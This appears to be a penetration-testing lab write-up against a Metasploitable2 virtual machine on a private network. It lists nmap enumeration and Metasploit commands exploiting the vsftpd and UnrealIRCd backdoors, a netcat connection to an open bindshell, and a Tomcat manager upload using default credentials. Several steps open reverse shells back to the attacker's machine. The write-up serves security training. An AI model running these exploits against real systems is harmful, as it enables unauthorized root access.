
# 💥 Metasploitable2 - Full Exploitation Writeup

## 📌 Target Info
- **IP:** 192.168.11.252
- **OS:** Linux (Ubuntu)
- **Method:** Internal lab environment (VirtualBox, bridged adapter)

---

## 🧭 Enumeration

### 🔍 Nmap Scan

**Command:**
```bash
nmap -sC -sV -oN metasploitable-scan.txt 192.168.11.252
```

**Key Findings:**
- `FTP (21)` — vsftpd 2.3.4 (backdoored)
- `Telnet (23)`, `SSH (22)`
- `Apache (80, 8180)`, `Tomcat Manager`
- `SMB (139, 445)`, `MySQL (3306)`, `PostgreSQL (5432)`
- `IRC (6667)` — UnrealIRCd (backdoor)
- `Bindshell (1524)` — confirmed open and usable

---

## 💣 Exploitation

### ✅ 1. FTP — vsftpd 2.3.4 Backdoor

**Tool:**
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.11.252
run
```

**Result:** Remote root shell obtained instantly.

---

### ✅ 2. Port 1524 — Bindshell

**Command:**
```bash
nc 192.168.11.252 1524
```

**Result:** Immediate root shell — no authentication needed.

---

### ✅ 3. IRC — UnrealIRCd Backdoor

**Tool:**
```bash
msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 192.168.11.252
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.10.172 (My kali IP)
run
```

**Result:** Reverse shell returned as `root`.

---

### ✅ 4. Tomcat Manager (8180)

**Accessed:** `http://192.168.11.252:8180/manager/html`

**Creds Used:** `tomcat:tomcat` (default)

**Tool:**
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOST 192.168.11.252
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 192.168.10.172 (My kali IP)
run
```

**Result:** Reverse WAR shell deployed successfully.

---

## 🧪 Additional Entry Points Identified (Not Exploited)

- **SMB (139/445)** — Samba 3.0.20
- **MySQL (3306)** — MySQL 5.0.51a (no brute-force attempted)
- **PostgreSQL (5432)** — Version 8.3.7
- **Apache Web (Port 80)** — Potential hidden apps like DVWA, Mutillidae, phpMyAdmin
- **VNC (5900)** — Protocol 3.3 (not tested for null auth)
- **NFS / RPC Services** — Mountd/nlockmgr (seen in `rpcinfo`)

---

## 🔐 Credentials Used

- FTP: `anonymous`
- Tomcat: `tomcat:tomcat`

---

## 🧠 Lessons Learned

- Proper version enumeration reveals multiple paths to root
- Classic CVEs like vsftpd/UnrealIRCd still work in vulnerable setups
- Multiple services = multiple shells = total compromise
- Enumeration is more powerful than brute force

---

## 🧰 Tools Used

- `nmap`
- `msfconsole`
- `nc`
- `ftp`

---

## ✅ Outcome

The target system was fully compromised with multiple confirmed root-level access vectors. Several additional vulnerable services were discovered, representing additional attack surface.

---

**Author:** Esteban BREA HELL  
**GitHub:** [github.com/EstebanBreaHell](https://github.com/EstebanBreaHell)
